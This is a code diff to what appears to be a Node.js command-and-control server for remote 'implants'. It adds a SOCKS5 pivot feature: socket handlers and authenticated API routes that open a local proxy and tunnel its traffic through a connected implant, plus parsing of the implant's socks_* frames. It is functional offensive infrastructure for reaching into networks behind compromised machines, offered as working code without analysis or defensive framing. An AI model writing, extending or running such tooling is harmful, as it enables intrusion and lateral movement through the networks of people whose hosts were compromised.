@@ -42,6 +42,8 @@ const bcrypt = require('bcryptjs');
 const nodemailer = require('nodemailer');
 const AdmZip = require('adm-zip');
 const os = require('os');
+const { SocksManager } = require('./socks5');
+const socksManager = new SocksManager();
 
 const app = express();
 const server = http.createServer(app);
@@ -1172,6 +1174,21 @@ function createTcpServer() {
 
         try {
           const raw = JSON.parse(line);
+          const wireType = String(raw.type || raw.Type || '').toLowerCase();
+
+          // SOCKS mux frames from implant (do not treat as terminal response)
+          if (wireType.startsWith('socks_')) {
+            socksManager.onAgentMessage(clientId, {
+              type: wireType,
+              id: raw.id != null ? raw.id : raw.ID,
+              data: raw.data || raw.Data,
+              error: raw.error || raw.Error,
+            });
+            const live = clients.get(clientId);
+            if (live) live.lastSeen = new Date();
+            continue;
+          }
+
           const message = {
             // unify keys from Go (capitalized) and JS (lowercase)
             type: raw.type || raw.Type,
@@ -1416,6 +1433,8 @@ function createTcpServer() {
   
   socket.on('close', () => {
     console.log(`[TCP] Client disconnected: ${clientIP}`);
+    try { socksManager.stop(clientId); } catch (_) {}
+    io.emit('socksStatus', { clientId, active: false });
 
     const client = clients.get(clientId);
     
@@ -1791,6 +1810,35 @@ io.on('connection', (socket) => {
   // Provide clients list on demand
   socket.on('getClients', () => {
     socket.emit('clientsList', Array.from(clients.values()).map(mapClientForGui));
+  });
+
+  socket.on('startSocks', async (data) => {
+    try {
+      const clientId = data?.clientId;
+      const client = clients.get(clientId);
+      if (!client || !client.socket || !client.active) {
+        socket.emit('socksStatus', { clientId, active: false, error: 'Client offline' });
+        return;
+      }
+      const info = await socksManager.start(clientId, client.socket, {
+        host: '127.0.0.1',
+        port: Number(data?.port) || 0,
+      });
+      io.emit('socksStatus', { clientId, active: true, ...info });
+    } catch (e) {
+      socket.emit('socksStatus', { clientId: data?.clientId, active: false, error: e.message });
+    }
+  });
+
+  socket.on('stopSocks', (data) => {
+    const clientId = data?.clientId;
+    socksManager.stop(clientId);
+    io.emit('socksStatus', { clientId, active: false });
+  });
+
+  socket.on('getSocksStatus', (data) => {
+    const clientId = data?.clientId;
+    socket.emit('socksStatus', { clientId, ...socksManager.status(clientId) });
   });
   
   // Handle command execution
@@ -2481,6 +2529,48 @@ app.delete('/api/users/:username', requireAuth, async (req, res) => {
   } catch (error) {
     console.error('[API] Failed to delete user:', error);
     res.status(500).json({ error: 'Failed to delete user' });
+  }
+});
+
+// ---- SOCKS5 pivot per session ----
+app.get('/api/socks/:clientId', requireAuth, (req, res) => {
+  try {
+    res.json(socksManager.status(req.params.clientId));
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'SOCKS status failed' });
+  }
+});
+
+app.post('/api/socks/start', requireAuth, async (req, res) => {
+  try {
+    const clientId = String((req.body || {}).clientId || '');
+    const port = Number((req.body || {}).port) || 0;
+    const client = clients.get(clientId);
+    if (!client || !client.socket || !client.active) {
+      return res.status(404).json({ error: 'Client offline or not found' });
+    }
+    // Implant must support socks_* frames (rebuild if old binary)
+    const info = await socksManager.start(clientId, client.socket, {
+      host: '127.0.0.1',
+      port,
+    });
+    io.emit('socksStatus', { clientId, active: true, ...info });
+    console.log(`[SOCKS] Started for ${client.hostname || clientId} on ${info.host}:${info.port}`);
+    res.json({ success: true, ...info, clientId });
+  } catch (e) {
+    console.error('[SOCKS] start failed:', e.message);
+    res.status(500).json({ error: e.message || 'Failed to start SOCKS' });
+  }
+});
+
+app.post('/api/socks/stop', requireAuth, (req, res) => {
+  try {
+    const clientId = String((req.body || {}).clientId || '');
+    socksManager.stop(clientId);
+    io.emit('socksStatus', { clientId, active: false });
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Failed to stop SOCKS' });
   }
 });
 
